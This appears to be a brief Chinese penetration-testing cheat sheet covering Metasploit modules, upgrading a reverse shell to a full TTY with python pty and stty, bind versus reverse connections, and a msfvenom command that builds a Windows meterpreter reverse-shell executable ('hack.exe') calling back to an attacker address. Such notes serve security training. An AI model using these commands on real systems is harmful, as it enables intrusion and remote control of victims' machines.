## Metasploit常用的几个模块

Exploit（漏洞exp模块）

Msfvenom生成木马（linux,windows)

Meterpreter内网渗透

## shell迁移

1. 首先连接到 shell 后，先检查一下 python 的可用性， 用 winch 命令检查：

```bash
which python python2 python3
```

只要安装了其中任何一个，就将返回已安装二进制文件的路径。

1. 在靶机上输入以下命令（使用机器上可用的 python 版本！）

```rust
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

1. 接下来，在靶机上输入以下命令来设置一些重要的环境变量：

```bash
export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色
```

1. 键入 ctrl-z 以将 shell 发送到后台。
2. 设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。

```bash
stty raw -echo;fg
```

回车一次后输入 reset 再回车将再次进入 shell 中：

![image](https://img2020.cnblogs.com/blog/1282531/202201/1282531-20220110102654230-1851709271.png)

到此 TTY shell 升级完成。

## 正向与反向连接

正向
攻击者主动连接受害者

反向
受害者主动连接攻击者

## msfvenom生成木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.99.5 LPORT=4444 -f exe >hack.exe
```

